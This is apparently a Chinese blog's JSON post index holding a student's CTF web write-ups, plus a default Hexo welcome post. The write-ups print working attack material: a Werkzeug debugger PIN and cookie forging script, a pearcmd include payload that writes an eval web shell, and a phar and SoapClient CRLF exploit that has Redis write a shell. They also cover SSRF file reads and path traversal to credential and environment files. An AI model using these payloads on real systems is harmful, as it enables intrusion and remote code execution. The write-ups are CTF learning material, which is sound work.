1http://ad9e0451-31fe-4654-85e8-c9fcba3c34d8.node4.buuoj.cn:81/?hint[0]=your?&amp;hint[1]=mine!&amp;hint[2]=hint!! 12345678910111213141516171819202122232425262728total 12drwxr-xr-x 1 root root 51 Nov 29 10:45 .drwxr-xr-x 1 root root 51 Nov 29 10:45 ..-rwxr-xr-x 1 root root 0 Nov 29 10:45 .dockerenv-rwxr-xr-x 1 root root 353 Oct 19 15:52 app.pylrwxrwxrwx 1 root root 7 Nov 22 2021 bin -&gt; usr/bindrwxr-xr-x 2 root root 6 Nov 8 2021 bootdrwxr-xr-x 5 root root 360 Nov 29 10:45 devdrwxr-xr-x 1 root root 66 Nov 29 10:45 etc-rw------- 1 root root 43 Nov 29 10:45 flagdrwxr-xr-x 2 root root 6 Nov 8 2021 homelrwxrwxrwx 1 root root 7 Nov 22 2021 lib -&gt; usr/liblrwxrwxrwx 1 root root 9 Nov 22 2021 lib32 -&gt; usr/lib32lrwxrwxrwx 1 root root 9 Nov 22 2021 lib64 -&gt; usr/lib64lrwxrwxrwx 1 root root 10 Nov 22 2021 libx32 -&gt; usr/libx32drwxr-xr-x 2 root root 6 Nov 22 2021 mediadrwxr-xr-x 2 root root 6 Nov 22 2021 mntdrwxr-xr-x 2 root root 6 Nov 22 2021 optdr-xr-xr-x 3994 root root 0 Nov 29 10:45 procdrwx------ 1 root root 20 Oct 19 15:52 rootdrwxr-xr-x 1 root root 21 Oct 19 15:50 runlrwxrwxrwx 1 root root 8 Nov 22 2021 sbin -&gt; usr/sbindrwxr-xr-x 2 root root 6 Nov 22 2021 srv-rwx------ 1 root root 241 Oct 19 15:52 start.shdr-xr-xr-x 13 root root 0 Sep 19 01:23 sysdrwxrwxrwt 1 root root 6 Nov 29 10:45 tmpdrwxr-xr-x 1 root root 19 Nov 22 2021 usrdrwxr-xr-x 1 root root 17 Oct 19 15:49 var 看一下curl_init,curl_setopt,curl_close，新东西查点资料，好像是curl能够爬取其他站点的内容（ 那这就有点鸡肋了啊，总不至于让你请求钓鱼网站然后中病毒木马什么的吧 查了一下，可以用file://伪协议读，那就挺好，一看权限，好读的也就app.py了 但是得注意一下curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST[&#39;lolita&#39;])，传入的要是一个数组 所以又用lolita[]小绕一下先，先读到再说… 1234567891011121314from flask import Flask, request, session, render_template, render_template_stringimport os, base64#from NeepuF1Le import neepu_filesapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;******&#x27;@app.route(&#x27;/&#x27;)def welcome(): if session[&quot;islogin&quot;] == True: return &quot;flag&#123;***********************&#125;&quot;app.run(&#x27;0.0.0.0&#x27;, 1314, debug=True)1 有个提示#from NeepuF1Le import neepu_files，就搜了一下，结果搜到出题人打NeepuCTF的题解了 感觉就是根据NeepuCTF的Cute Cirno改编的，有异曲同工之妙，但是就算SSRF了1314端口也拿不到真的flag（ 所以应该是要算pin码了，趁着这个时机好好学一下算pin码 username，用户名(&#x2F;etc&#x2F;passwd里面找（（太草了) modname，默认值为flask.app appname，默认值为Flask moddir，flask库下app.py的绝对路径（报错好搞 uuidnode，当前网络的mac地址的十进制数（&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address） machine_id，docker机器id（如果是docker靶机的话 1/etc/machine-id`或者`/proc/sys/kernel/random/boot_id`其中一个拼接上`/proc/self/cgroup 123456789101112131415161718192021222324252627282930313233root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologin/usr/local/lib/python3.10/dist-packages/flask/app.py/sys/class/net/eth0/addressea:77:05:58:af:2f-&gt;ea770558af2f-&gt;257796911705903/proc/sys/kernel/random/boot_id8cab9c97-85be-4fb4-9d17-29335d7b2b8a/proc/self/cgroupaaf831f68f4d63d20b2aa0cf361710787006861f59aff5c33aa21641dde24948sli0Abbstc8jO5ov16OhS 照着脚本倒是可以算了，但是因为是php的curl，所以只能用爬取数据，但是无论如何先用POST试一下把 POST也不行，我的username试了root和www-data来着，总不可能是username的问题把，感觉就是没法访问的问题（（ 瞪不出来，遂看题解，题解也当谜语人，有点绷不住，于是参考了z1d10t的题解 https://z1d10t.fun/post/dcc8a51b.html#WEEK5 原来是/proc/self/cgroup获取的内容和往常算pin码的题不一样，受教了，正确解如下 取第一行的最后一个斜杠/后面的所有字符串那么肯定是对的 然后由于console不出网，所以没法通过浏览器直接进入控制台，这个时候需要手算cookie，具体参考如下 https://unk.icu/2023/06/19/flask-pin/ 无法直接进入控制台的情况下，对于发送验证pin码的请求有格式上的要求，最重要的就是s，然而这个是可以直接读的，好像还有个frm参数，但是好像是无所谓的（（（如果需要直接访问报错页面在html源码里就能找到 格式大概如下 1GET /?__debugger__=yes&amp;cmd=pinauth&amp;pin=xxx-xxx-xxx&amp;s=prj74Iraob1k5eMHiH37 若auth成功，还会带一个cookie： 1Set-Cookie: __wzdaba192b254d6aa653a27=1687143761|fd1c004c3dc3; HttpOnly; Path=/; SameSite=Strict 之后执行命令的请求，要带上面发过来的cookie，否则不执行命令： 12GET /?&amp;__debugger__=yes&amp;cmd=print(1)&amp;frm=140324285712640&amp;s=prj74Iraob1k5eMHiH37Cookie: __wzdaba192b254d6aa653a27 手算cookie的话，直接见全脚本吧（z1d10t佬的题解还可以用gopher发包读到set的cookie值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import hashlibimport timefrom itertools import chainprobably_public_bits = [ &#x27;root&#x27; # /etc/passwd &#x27;flask.app&#x27;, # 默认值 &#x27;Flask&#x27;, # 默认值 &#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27; # 报错得到]private_bits = [ &#x27;16476878681546&#x27;, # /sys/class/net/eth0/address 16进制转10进制 # machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup &#x27;&#x27; # /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = num#hash_pin作为手算cookie的一部分def hash_pin(pin: str) -&gt; str: return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12] print(rv)#手算cookie的第二部分print(cookie_name + &quot;=&quot; + f&quot;&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;&quot;) 用Postman发包好使（（（复现成功了，注意传参不能有空格，也不是%20，而是%2B&#x3D;’+’（加号-0_0- ———————————————————————————————————————————————————————————— 4-复盘文件一多我就寄，慌了神，其实这是一道很简单的联想题，但是我又被迷惑了双眼，审代码审的昏天黑地也没把握到本质，最后只能玉玉 玉玉之后就只能看题解，结果只是简单的文件包含，要调用pearcmd的话并不一定是include，像file_exist这样的也是同理的 就是要想到有装pearcmd这个插件有点难度，而且还是一句老话，用burp传（（，直接在地址栏传也直接寄 1/index.php?+config-create+/&amp;page=/../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/var/www/html/1.php 多套几层../，套多了不会怎么样，套少了就读不到了（（（，然后蚁剑连接SUID提权，比赛结束后靠经典命令就读不到了，原因未知 然后就是gzip提权，博客也就不引了，可以自己搜索一下 ———————————————————————————————————————————————————————————— NextDrive一道神秘题，主要看你有没有好奇心，我的好奇心自然是早就被磨灭了（，看到文件也不下载，只想着摆烂看题解了 （也有可能是最后一题的因素在把，想赶紧干完去搞别的了┭┮﹏┭┮ 总之就是先随便注册一个账号，下载共享区里的test.res.http，然后呢你可以试着自己上传一个文件，发现它分两次请求，第一次只需要一个hash值和一个文件名就能完成，第二次才是真正的传输文件数据，然后就是考眼力的时候 在test.res.http里面有一个请求没发送出去，（坑，名字叫做test.req.http，所以有理由推断我们可以伪造发送这个请求，然后就能直接拿到这个文件的数据（此点可以随便试着伪造一个共享区的文件上传，发现不需要第二次传输 拿到数据之后是admin的用户凭据，直接修改uid和token就能admin上号了，上号之后可以观察本地资源，可疑的就是share.js 一通审之后，发现有些函数调用的是hash_fn，有些调用的则是hash，而且path.resolve会强行忽略不重要的path路径名使之尽可能有效，那么我们就有理由实现一个目录穿越了，因为hash是hash_fn的前64位所以说64位以后的我们就能伪造成我们想要的路径了 可以测试一下../../../../etc/passwd或者也可以直接../../../../../proc/self/environ，记住得用linux的curl来发包， windows的curl应该是不行的，bp没试过（有兴趣的可以尝试一下 然后读环境变量的话要加--out filename参数把读到的二进制文件保存在一个指定的文件里 ———————————————————————————————————————————————————————————— 至此我的NewstarCTF2023的征程算是告一段落了，有学到很多东西，我要是能牢牢记住的话应该会很不错，后三周题目质量对于我这样的初学者来说真的挺好的，感谢各位出题师傅，也感谢没有放弃的我自己^_^","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"XDSEC-HW-1","slug":"XDSEC-HW-1","date":"2023-11-18T10:30:30.000Z","updated":"2023-11-18T10:31:38.811Z","comments":true,"path":"2023/11/18/XDSEC-HW-1/","permalink":"http://example.com/2023/11/18/XDSEC-HW-1/","excerpt":"","text":"Fake_Upload（长文警告！！！长文警告！！！） 首先随便传一个正常的图片上去，确实能传成功，点击跳转页面发现file参数GET可控，所以随便写一个值 发现网页回显了一个坏掉的图片的icon，用Chrome的话直接f12看源码，可以找到file_get_contents(“111”)显示找不到，说明这里对file参数没做什么过滤，试试看&#x2F;etc&#x2F;passwd，我这边是没有回显的，感觉是没权限，不知道为啥writeup里可以看到 于是乎就试试别的路径，&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php或者show.php，都是可以读到的 index.php: 12345678910111213&lt;?phperror_reporting(0);include_once &#x27;class.php&#x27;;if (!empty($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123; $tmp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; if (is_uploaded_file($tmp_name)) &#123; $upload = new upload($tmp_name, $filename); $upload-&gt;uploadImage(); &#125;&#125; ?&gt; show.php: 123456789&lt;?phpinclude_once &#x27;class.php&#x27;;if (isset($_GET[&#x27;file&#x27;])) &#123; if($_GET[&#x27;file&#x27;]) header(&#x27;Content-type: image/jpeg;&#x27;); echo file_get_contents($_GET[&#x27;file&#x27;]);&#125; else &#123; die(&#x27;?&#x27;);&#125; 可以看到show.php，include一个’class.php’，不妨把它也读出来 class.php: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php// I deployed a redis service with a password you never knowclass upload&#123; public $check; public $tmp_name; public $filename; public function __construct($tmp_name, $filename) &#123; $this-&gt;check = new Check(); $this-&gt;filename = $filename; $this-&gt;tmp_name = $tmp_name; &#125; public function uploadImage() &#123; if ($this-&gt;check-&gt;CheckName($this-&gt;filename)) &#123; $filepath = &quot;uploads/&quot; . $this-&gt;filename; if (move_uploaded_file($this-&gt;tmp_name, $filepath)) &#123; echo &quot;Upload success! Check your file &lt;a href=\\&quot;show.php?file=&quot; . $filepath . &quot;\\&quot;&gt;here&lt;/a&gt;.\\n&quot;; &#125; else echo &quot;Upload fail!\\n&quot;; &#125; else die(&#x27;Dangerous file!&#x27;); &#125; public function __destruct() &#123; $filepath = __DIR__ . &quot;/uploads/&quot; . $this-&gt;filename; if (file_exists($filepath)) &#123; if (!$this-&gt;check-&gt;CheckContent($filepath)) &#123; @unlink($filepath); die(&#x27;Dangerous file!&#x27;); &#125; &#125; &#125;&#125;class Check&#123; public function CheckName($filename) &#123; $ext = pathinfo($filename, PATHINFO_EXTENSION); return in_array($ext, array(&#x27;jpg&#x27;, &#x27;png&#x27;), true); &#125; public function CheckContent($filename) &#123; if (!getimagesize($filename)) return false; if (preg_match(&quot;/php|&lt;\\?/i&quot;, file_get_contents($filename))) return false; else return true; &#125;&#125; 在class.php注释里他说部署了一个redis应用并设了密码，那就顺便读一下redis.conf 一般路径是&#x2F;etc&#x2F;redis&#x2F;redis.conf，读到之后CTRL+F搜关键词pass就可以了 1requirepass fd0a2283945caf801e374907e8c24da3 然后对每段代码进行一下说明 index.php先看index.php，在前端是没有任何过滤的，传了文件之后就是用$_FILES来获取文件内容，所以我们要知道$_FILES是什么 当客户端提交之后，会获得一个$_FILES数组 12345$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot; $_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) 可以看到index.php调用了’name’和’tmp_name’这两个参数，然后new了一个upload类并调用了uploadImage class.php所以我们把目光转向class.php，它定义了一个upload类，一共有三个属性，其中check属性是另一个类 那就先看看check类，check类有两个方法，一个是checkname，一个是checkcontent 12345public function CheckName($filename)&#123; $ext = pathinfo($filename, PATHINFO_EXTENSION); return in_array($ext, array(&#x27;jpg&#x27;, &#x27;png&#x27;), true);&#125; 通过pathinfo和PATHINFO_EXTENSION获取传入filename的后缀扩展名（很准 然后用in_array判断这后缀是否是’jpg’和’png’其中一个，如果是则返回1，不是则返回空 12345678public function CheckContent($filename) &#123; if (!getimagesize($filename)) return false; if (preg_match(&quot;/php|&lt;\\?/i&quot;, file_get_contents($filename))) return false; else return true; &#125; 用getimagesize判断是不是图片，preg_match查找传入文件的内容中是否含有php或者&lt;?，反斜杠用来转义 返回false就会die（（（ 然后我们再回到upload类，属性讲完，接下来一步步讲它的各种方法 首先是魔术方法_construct()，传入两个参数分别作为tmp_name和name属性的值，初始化类的作用 然后定义了一个uploadImage()方法，其中要讲的是move_uploaded_file move_uploaded_file(string $from, string $to): bool，将上传的文件移动到新位置 一般来说，在上传文件的时候，$from都是$tmp_name，然后把他移动到相应上传的位置，但是暂存文件名不会保留，照理来说这里好像是可以靠竞争上传打一个马进去，但是后面又让我有点疑惑 就是下一个魔术方法_destruct()，这个方法就是用checkcontent再检查了一遍上传文件的内容，如果检测到危险就会unlink上传的文件，unlink就是通过文件的路径删除该路径上的文件，@表示强制执行 而众所周知，_destruct一般在代码结束的时候才会执行，所以即使假设上传成功了一个马，但是它又会被检测之后删除，可以预见的是在_construct和_destruct之间有一个时间差，通过竞争可能可以在上一个_destruct还没执行好永久上传上一个想要的文件 show.php就提一下header()，实际上就是把请求的header修改成括号里传入的格式，这里是改了content-type，也就是说所有得到的内容都将通过jpg&#x2F;mpeg格式来展现 然后就是用file_get_contents()读取一个文件，这里没有做任何过滤或WAF，所以可以很轻松地实现任意文件读取 一些尝试首先我想试试能不能绕过pathinfo，一般来说是00截断，要是00截断不行那基本路就堵死了 用burp试了一下，果然直接寄掉，pathinfo应该也是直接读00截断之后的文件后缀的，php传不上去该怎么办呢 这个时候就会想到phar了，因为phar文件即使后缀为jpg等格式也能正常执行 因为上传了phar文件之后还需要用phar伪协议来实现反序列化，所以得考虑题目是否有一些常见的文件操作函数 而show.php中的file_get_contents正是我们所需要的文件操作函数，并且show.php还include了class.php 这就让一条无形的POP链串通了我们想要的反序列化实现类的魔术方法的操作 123456789101112131415161718&lt;?php class test&#123; public $name=&quot;qwq&quot;; function __destruct() &#123; echo $this-&gt;name; &#125;&#125;$a = new test();$a-&gt;name=&quot;phpinfo&quot;;$phartest=new phar(&#x27;phartest.phar&#x27;,0);//后缀名必须为phar$phartest-&gt;startBuffering();//开始缓冲 Phar 写操作$phartest-&gt;setMetadata($a);//自定义的meta-data存入manifest$phartest-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测$phartest-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);//添加要压缩的文件#签名自动生成$phartest-&gt;stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘?&gt; 可以用上面这段代码在本地进行一下生成phar的测试，记得php.ini的phar.readonly要设置成Off 看了点例题，发现传phar上去反序列化好像毫无用处，唯一能触发且有一点用的是_destruct，但那玩意也是真的没什么用啊，除了检查和unlink，好像就什么都干不了，是不是我脑洞还不够大呢？ 其实做题的时候我一直避着hint走，因为我不知道什么是soap，所以我查资料的时候是不带soap的，如果你也bing搜了phar ssrf redis，那么你可能会搜到这样一篇博客 https://blog.csdn.net/solitudi/article/details/110521104 由于其他的博客统统一眼就看出来不和此题目环境适配，所以这篇博客介绍的soap好歹是做题的转机 即便你像我一样不知道什么是soap，通过搜索和排除应该也能找到一丝线索，而事实证明确实方向是对的 Soap在php中，SoapClient是内置的一个类，用于向服务端通过SOAP协议进行通信，关于实际的原理我了解的也不是很深入，对于做题来说只要知道SoapClient有一个魔术方法__call()，如果能触发这个魔术方法，那么我们就能够触发一个POST请求来伪造服务端向redis请求服务(ssrf)，因为redis也不出网的 而众所周知，为了触发__call()，需要我们调用该类的一个未定义的函数，而class.php中正好就有这个条件 你可以通过以下代码尝试往你的vps用SoapClient的__call()方法发送一个POST请求 但是首先得在php.ini里把soap的扩展给打开，如果是windows会和php本体一起安装，linux要额外install一下 123&lt;?php$a=new SoapClient(null, array(&#x27;uri&#x27;=&gt;&#x27;bbb&#x27;,&#x27;location&#x27;=&gt;&#x27;vps-ip:port&#x27;));$a-&gt;unexisted(); 记得vps上要开监听 那么我们是一定要对POST内容有所控制的，不然就算发送了也没什么用（（（ 正好SoapClient可以控制User-Agent和URI，但注意写在php里的是user_agent对应Headers的User-Agent 那么我们就可以CRLF，控制POST请求中的内容，跟本地的redis进行通信然后往根目录里写shell 逻辑 redis服务仅在容器本地开放，并未映射到容器外 可传文件基本已经锁死是phar，题目给的类没什么用，用php内置SoapClinet类 phar反序列化需要file_get_contents(phar://)，反序列化后触发SOAP的__call，发送可控POST请求 使$this-&gt;check是SoapClient类 SoapClient伪造POST请求，把redis命令写入content（记得auth，本地测试 把得到的$this作为meta-data写入phar中 POC1234567891011121314151617181920&lt;?phpclass upload&#123; public $check; public $tmp_name; public $filename;&#125;$a = new upload();$poc=&quot;auth fd0a2283945caf801e374907e8c24da3\\r\\nflushall\\r\\nconfig set dir /var/www/html\\r\\nconfig set dbfilename shell.php\\r\\nset jex &#x27;&lt;?=eval(\\$_REQUEST[&#x27;cmd&#x27;]?&gt;&#x27;\\r\\nsave&quot;;$pop = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;bbb&#x27;,&#x27;user_agent&#x27;=&gt;&quot;jex\\r\\n&quot;.$poc.&quot;\\r\\njex&quot;, &#x27;location&#x27;=&gt;&#x27;http://127.0.0.1:6379&#x27;));$a-&gt;check=$pop;$phartest=new phar(&#x27;phar.phar&#x27;,0);//后缀名必须为phar$phartest-&gt;startBuffering();//开始缓冲 Phar 写操作$phartest-&gt;setMetadata($a);//自定义的meta-data存入manifest$phartest-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测$phartest-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);//添加要压缩的文件#签名自动生成$phartest-&gt;stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘rename(&quot;phar.phar&quot;,&quot;phar.jpg&quot;); 然后就是竞争上传的内容了^_^ 打竞争的时候传phar.jpg到公网映射的端口老是connection reset，问了才知道是被校园网拦了，但是如果在本地搭的docker的话应该没有这个问题⑧，所以我就直接往uploads&#x2F;里放了phar.jpg 本以为到这一步应该就可以很轻松地phar://uploads/phar.jpg然后写一个shell.php了，然而老天爷似乎给我开了个玩笑，事实是报错了，输得很彻底 我一开始以为是我phar生成脚本有问题，所以我就去writeup里搬了份一样的，结果还是不行，这就有点狗血了 后来和学长交流之后，学长告诉我php8+就不再支持phar:&#x2F;&#x2F;自动反序列化了，而事实证明确实如此，我用本地的8.2解释器确实是没法反序列化触发类的魔术方法，因此，我就去找是否有文档说明了这一点 结果是用bing搜关键词没搜到，官方文档看了php8的changelog疑似也没找到，最后还得用google才能找到… 参考： https://php.watch/versions/8.0/phar-stream-wrapper-unserialize 你可能会问：你说的很对，但是容器里的php是7.4又不是8+，为什么还会报错呢？？？ 这是个好问题，因为php8+虽然不支持phar:&#x2F;&#x2F;自动反序列化，然而这并不代表phar这个功能就被废除了，只要把phar.readonly设置成off，你还是能照样生成phar，使用它平常和jar类似的功能，可恰恰问题就出在这里 php8+用上述代码跑出来的phar文件和php8-跑出来的phar文件是不一样的，至于为什么会这样，我个人推测是有些默认参数发生了变化，比如自动反序列化的参数可能php8+就默认是关闭的而8-是开启的，不过我也没深究，总之用php7跑出来的phar再用phar:&#x2F;&#x2F;传参就没问题了，成功写入了shell.php，能随便写了那就想干嘛都可以了 —————————————————————————————————————————————————— hahaphp这题真的是牛魔酬宾，太搞了（（（路径写个”不告诉你”给我整不会了 访问映射端口11100直接403Forbidden，原来是可以直接访问upload.php，然后源码都给了（waf不知道给没给.. upload.php: 1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);include(&#x27;waf.php&#x27;);extract($_POST);$waf = new waf();if(isset($_POST[&#x27;submit&#x27;])) &#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;There is something wrong:&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; $dst = &#x27;/var/www/html/不告诉你&#x27;; $fileinfo = array($_FILES[&quot;file&quot;][&quot;name&quot;],$dst); if (file_exists(&quot;$fileinfo[1]/$fileinfo[0]&quot;)) &#123; echo $fileinfo[0] . &quot; has already existed :)&quot;; &#125;else &#123; $waf-&gt;data=$fileinfo[0]; $waf-&gt;check(); move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;$fileinfo[1]/$fileinfo[0]&quot;); $msg=&quot;file name:%s&quot;; foreach($fileinfo as $key =&gt; $value)&#123; $msg = sprintf($msg, $value); &#125; echo $msg; &#125; &#125; &#125; echo &quot;&lt;/h4&gt;&quot;;?&gt; waf.php: 123456789101112131415161718&lt;?phpclass waf&#123; public $data; public function check() &#123; $meow = $this-&gt;data; $blacklist = array(&quot;php5&quot;,&quot;php&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;,&quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;, &quot;\\(&quot;, &quot;\\)&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;); foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $meow)) &#123; die(&quot;You hacker out&quot;); &#125; &#125; return $this-&gt;data; &#125;&#125; 但是如果给了源码还有必要再找路径吗？？？（（（直接就在源码里了啊，其实换成secret就行 然后就是关于php-sprintf的一些知识，不懂遂开搜，参考如下，写的比较全也比较好 https://blog.csdn.net/qq_34106499/article/details/104085265 当然读Official Manual也是可以的，就是我偷懒了 毕竟是一个上传的界面，就随便传点东西看看，传一张png，没回显文件地址，但是通过file name: 2.png直接显示在了页面的最上面，那么通过分析源码我们可以知道，其实是对文件名做了一个格式化字符串的替换，但是它多次一举，替换了一次%s之后还要再替换一次，那就直接把文件名改成%s就能触发下一次替换目录的操作了 ps：实际上我一开始没看源码，直接在bp里狂试，最后直接写个%s就弹地址了，或者%1$s也是可以的，就是很疑惑的是为什么这个路径是错的呢？？（指dockerfile路径和这个源码的路径不一样），我绞尽脑汁也没找到这个源码还有什么别的地方调用了当前地址，只能认为是路径没写好，因为后面还会用到所以这个问题挺重要的 拿到目录之后访问haha.php，发现什么都没有，那么就要想是不是有备份文件或者.git什么的了，不知道能不能扫出来，反正试个大概就有了，swp备份的话就是备份文件名前面有个点号要注意，.haha.php.swp这样子 然后vim -r haha.php.swp恢复一下源码，和haha.php的源码稍微有一点出入就是waf类不存在的uploadcheck()换成了实际存在的check()，说实话有点会让人想歪到__call()，但是也没什么内置类用就是了 haha.php: 12345678910111213141516&lt;?phperror_reporting(0);include(&#x27;../waf.php&#x27;);echo &quot;&lt;h4 align=&#x27;center&#x27;&gt;Hello&lt;/h4&gt;&quot;;$a=new waf();spl_autoload_register();if(isset($_COOKIE[&quot;filenames&quot;]))&#123; $a-&gt;data=$_COOKIE[&quot;filenames&quot;]; if(strlen($a-&gt;check()) &lt;= 8)&#123;$filenames=unserialize($_COOKIE[&quot;filenames&quot;]);&#125;&#125;else&#123; $filenames=&#x27;test.test&#x27;; file_put_contents($filenames,&#x27; test&#x27;);&#125;?&gt; 有个很可疑的函数调用，spl_autoload_register()，我的老规矩还是查民间博客，这个函数如果（）内未指定参数那么默认调用同文件夹下的所有类，可以用以下代码查看调用类的格式要求 1234&lt;?phpspl_autoload_register();echo spl_autoload_extensions(); 回显是.inc,.php，那么.inc是哪种文件呢？实际上.inc类文件是类C语言基本通用的include file（虽然php用的多），所以你可以将函数和类等声明放在里面，然后为其他的php文件供以调用 然后到waf.php中找是否墙了.inc，发现没墙，那么思路就很清晰了，找了一篇参考博客，下面讲一下思路 https://cloud.tencent.com/developer/article/1717668 传一个a.inc到目录下，里面可以写执行任意代码的php，比如&lt;?php phpinfo();?&gt; 对xxx.inc后缀名前面的xxx定义成一个类，我这里是a就是定义一个名为a的类 对于a这个类属性和方法什么都不要写，直接序列化echo输出，一会要传cookie反序列化 用hackbar传cookie值，反序列化之后直接就会调用a.inc里面的函数 一些问题首先文件上传路径有误，上传到/不告诉你真的是有点幽默了，改了之后才能通 然后就是对传cookie的filenames的长度有限制，小于等于8，但是几乎最小的类的序列化都有12的长度 O:1:&quot;a&quot;:0:&#123;&#125;，但是似乎O:1:&quot;a&quot;:就可以了，虽然php8.2会报错但是php7.4不会（php8+又输）:sob: —————————————————————————————————————————————————— 总结让我对upload类题目有了更深的理解，只能说好题好题，玩的很开心，就是做题体验有时有点糟 但是纠错研究的感觉也还是挺有意思的，特别是php版本带来的不同让我印象深刻:smile: phar,soap,spl_auto_register等都是新东西，这下真是强壮web人了 鸣谢xlccccc","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"Hello World","slug":"hello-world","date":"2023-11-11T11:09:09.094Z","updated":"2023-11-11T11:09:09.094Z","comments":true,"path":"2023/11/11/hello-world/","permalink":"http://example.com/2023/11/11/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]}